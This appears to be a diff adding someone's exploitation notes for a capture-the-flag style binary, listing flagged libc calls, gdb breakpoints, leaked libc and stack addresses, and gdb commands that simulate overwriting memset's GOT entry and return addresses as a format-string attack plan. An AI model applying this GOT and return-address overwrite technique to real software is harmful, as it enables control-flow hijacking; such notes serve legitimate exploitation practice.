@@ -1,0 +1,80 @@
+set_message:
+puts
+fgets
+strlen (!)
+rand (most likely not)
+puts
+fgets
+strlen
+rand...
+
+get:
+puts
+fgets
+strcmp (!)
+puts x2
+printf (!)
+puts
+rand
+puts
+printf
+fgets
+strcmp
+memset (!!!)
+puts
+
+STACK S_S RETURN: 0000| 0x7fffffffdf98 --> 0x400f1b (<main+35>:	mov    eax,0x0)
+
+g_m return: 0x7fffffffde58
+
+upgrade:
+
+
+18292bd12d37bfaf58e8dded9db7f1f5da1192cb  /lib/x86_64-linux-gnu/libc.so.6
+
+Secret Message:
+====================
+7fcdbdd487e3 7fcdbdd498c0 7fcdbda6c154 14 7fcdbdf5c4c0 7ffd04292e80 7ffd04292ea0 24bd262
+
+
+b *0x400d5b for g_m ret
+b *0x400e9d for s_s ret
+b *0x400f20 for main ret
+
+7ffff7dd07e3
+libc leak: 1: 7fafeb6527e3
+stack leak: 6: 0x7fffffffde60
+
++-440 for first stack leak
+
+304 offset after that
+
+
+set {int}0x602050=0x400da0 memset overwrite
+
+set {int}0x7fffffffde58=0x400da4 G_M
+
+set {short}0x602050=0x3440
+set {int}0x7fffffffdd28=0x400da4 G_M
+
+set {short}0x602052=0xf7a3
+set {int}0x7fffffffdbf8=0x400da4
+
+set {short}0x602054=0x7fff
+set {int}0x7fffffffdac8=0x400da4
+
+set {int}0x7fffffffdf98=0x400da4 FIRST
+set {long}0x7fffffffdfb8=0x400da4 SECOND
+0x7fffffffdfb8
+
+set {short}0x602050=0x3440
+set {short}0x602052=0xf7a3
+
+overwrite get_message: leak stack
+overwrite memset 1: overwrite s_s
+overwrite memset 2: main
+
+overwrite memset -> leak stack
+overwrite first memset, first stack return 
+overwrite second memset, second stack return
+SURVIVE
